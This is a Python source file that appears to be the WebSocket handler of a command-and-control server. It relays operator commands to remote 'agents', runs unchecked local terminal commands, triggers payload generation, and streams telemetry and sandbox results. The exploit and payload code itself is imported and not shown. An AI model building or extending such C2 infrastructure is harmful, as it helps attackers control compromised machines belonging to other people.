# sockets/handler.py

from core.logger import log
from terminal.engine import TerminalEngine
from analysis.sandbox import analyze_file

# 🔥 IMPORT NEW AGENT SYSTEM
from sockets.agent_handler import send_command

terminal = TerminalEngine()


def register_socket_handlers(socketio):

    # ─────────────────────────────
    # 🔌 CONNECT / DISCONNECT
    # ─────────────────────────────
    @socketio.on("connect")
    def on_connect():
        log("Client connected via WebSocket")

        try:
            from flask import current_app

            if hasattr(current_app, "state"):
                socketio.emit("init", {
                    "agents": current_app.state.get_agents(),
                    "listeners": current_app.state.get("listeners") or {},
                    "stats": current_app.state.get_stats()
                })

        except Exception as e:
            log(f"Init state error: {e}")

    @socketio.on("disconnect")
    def on_disconnect():
        log("Client disconnected")

    # ─────────────────────────────
    # 🧠 TERMINAL (LOCAL SYSTEM)
    # ─────────────────────────────
    @socketio.on("terminal_command")
    def terminal_command(data):
        try:
            command = data.get("command", "")

            log(f"[TERMINAL] {command}")

            output = terminal.execute(command)

            socketio.emit("terminal_output", {
                "data": output
            })

        except Exception as e:
            socketio.emit("terminal_output", {
                "data": f"[ERROR] {str(e)}"
            })

    # ─────────────────────────────
    # 🚀 AGENT COMMAND (REAL C2 CORE)
    # ─────────────────────────────
    @socketio.on("agent_command")
    def agent_command(data):
        try:
            agent_id = data.get("agent_id")
            command = data.get("command")

            if not agent_id or not command:
                socketio.emit("terminal_output", {
                    "data": "[ERROR] Invalid command format"
                })
                return

            log(f"[C2 → AGENT] {agent_id}: {command}")

            success = send_command(agent_id, command)

            if not success:
                socketio.emit("terminal_output", {
                    "data": f"[ERROR] Agent not found: {agent_id}"
                })
            else:
                socketio.emit("terminal_output", {
                    "data": f"[✓] Command sent to {agent_id}"
                })

        except Exception as e:
            socketio.emit("terminal_output", {
                "data": f"[ERROR] {str(e)}"
            })

    # ─────────────────────────────
    # 📡 GET AGENTS
    # ─────────────────────────────
    @socketio.on("get_agents")
    def get_agents():
        try:
            from flask import current_app

            if hasattr(current_app, "state"):
                agents = current_app.state.get_agents()

                socketio.emit("agents_update", agents)

        except Exception as e:
            log(f"Get agents error: {e}")

    # ─────────────────────────────
    # 📦 PAYLOAD GENERATION
    # ─────────────────────────────
    @socketio.on("generate_payload")
    def generate_payload_socket(data):
        try:
            from payloads.generator import generate_payload

            payload = generate_payload(data)

            socketio.emit("payload_generated", payload)
            log("Payload generated successfully")

        except Exception as e:
            log(f"Payload generation error: {e}")
            socketio.emit("payload_generated", {"error": str(e)})

    # ─────────────────────────────
    # 📊 TELEMETRY STREAM
    # ─────────────────────────────
    @socketio.on("telemetry_push")
    def telemetry_push(data):
        try:
            socketio.emit("telemetry", data)
        except Exception as e:
            log(f"Telemetry error: {e}")

    # ─────────────────────────────
    # 🧪 SANDBOX ANALYSIS
    # ─────────────────────────────
    @socketio.on("sandbox:analyze")
    def sandbox_analyze(data):
        try:
            file_path = data.get("file")

            socketio.emit("sandbox:log", {
                "data": f"[+] Analyzing {file_path}"
            })

            result = analyze_file(file_path)

            socketio.emit("sandbox:result", result)

        except Exception as e:
            socketio.emit("sandbox:log", {
                "data": f"[ERROR] {str(e)}"
            })

    # ─────────────────────────────
    # 📜 LOG STREAM
    # ─────────────────────────────
    @socketio.on("get_logs")
    def get_logs():
        socketio.emit("log", {
            "time": "SYSTEM",
            "message": "Log stream active"
        })
